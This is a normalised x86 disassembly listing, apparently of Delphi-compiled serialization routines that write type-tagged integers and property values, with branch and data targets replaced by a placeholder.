mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e2a8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41e2a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e372
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_41e3a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e3eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4041f0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4203c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3f2
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_41e3f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41e48a
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_4204c8
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ec64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e491
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_419080
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41ec5c
mov edx esi
mov eax edi
call sub_419088
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ecb0
mov eax [ ebp - 0x4 ]
call sub_41ec64
inc esi
dec ebx
jne r-xdata
sub_41e498
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_418310
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407e64
test al al
jne r-xdata
sub_41e4e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e62f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_420d38
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41e498
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420d0c
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_420d38
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420d0c
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e636
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420d0c
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420d0c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41e63c
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ea18
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031e0
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_4042c8
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e23c
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e37c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41ec6c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031e0
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_40426c
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_4202e0
mov eax [ ebp - 0x8 ]
call sub_4031d8
call sub_4034b8
call sub_41469c
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_40426c
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4031e0
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_40426c
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_404388
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_4202e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ecb0
mov eax [ ebp - 0x4 ]
call sub_41ec64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41e9b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4202e0
mov eax [ ebp - 0x4 ]
call sub_41e23c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418310
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9c0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41e977
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41e4e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_403290
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e1dc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_40348c
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41e9c0
mov eax [ ebp - 0x4 ]
call sub_41ec64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ea1f
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_40402c
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e23c
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e254
sub_41ea3c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_4204c8
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41e2a8
pop ebx
pop ebp
retn 0xc
sub_41ea60
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_4204c8
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e2a8
pop ebx
pop ebp
retn 0x4
sub_41ea84
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_4204c8
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e2a8
pop ebx
pop ebp
retn 0x8
sub_41eaa8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_4204c8
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e2a8
pop ebx
pop ebp
retn 0x8
sub_41eacc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_407e64
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_407e64
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_4204c8
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_407e64
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_4204c8
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_407e64
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_4204c8
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_4204c8
mov edx esi
mov eax ebx
call sub_4202e0
mov dl 0xd
mov eax ebx
call sub_4204c8
jmp r-xdata
sub_41eb90
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_4204c8
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e2a8
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_4204c8
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e2a8
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_4204c8
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41e2a8
jmp r-xdata
pop edx
pop ebx
retn
sub_41ec04
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_4204c8
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e2a8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41eb90
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41ec6c
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41e2a8
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41eb90
sub_41ecb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4034b8
call sub_41469c
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41ed5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4034b8
mov edx [ ebp - 0x10 ]
call sub_4148a0
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4148f4
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41fd44
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41ed78
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4031d8
mov edx eax
mov eax [ edi ]
call sub_4034a4
test al al
jne r-xdata
mov al 0x1
sub_41eda8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414924
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414924
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41ee00
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414e54
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414e54
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41ee5c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415270
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415270
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41eeb4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41ef33
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414c98
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_404860
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414c98
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404860
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef3a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404700
retn
sub_41ef44
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e64
test al al
jne r-xdata
mov al 0x1
sub_41ef84
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414924
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41ef44
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41efdc
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414924
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push ebp
call sub_41ef84
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41ef84
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f05c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f108
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f10f
lea eax [ ebp - 0x8 ]
call sub_405874
lea eax [ ebp - 0x4 ]
call sub_405874
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152d4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d080
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41ef44
pop ecx
mov ebx eax
sub_41f128
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f1e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4152d4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405874
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d080
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1ec
lea eax [ ebp - 0x10 ]
call sub_405874
lea eax [ ebp - 0xc ]
call sub_405874
lea eax [ ebp - 0x4 ]
call sub_405874
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152d4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f05c
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41f204
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4151f8
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4151f8
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_40354c
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f27c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f303
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415178
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_413e20
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415178
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_413e94
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
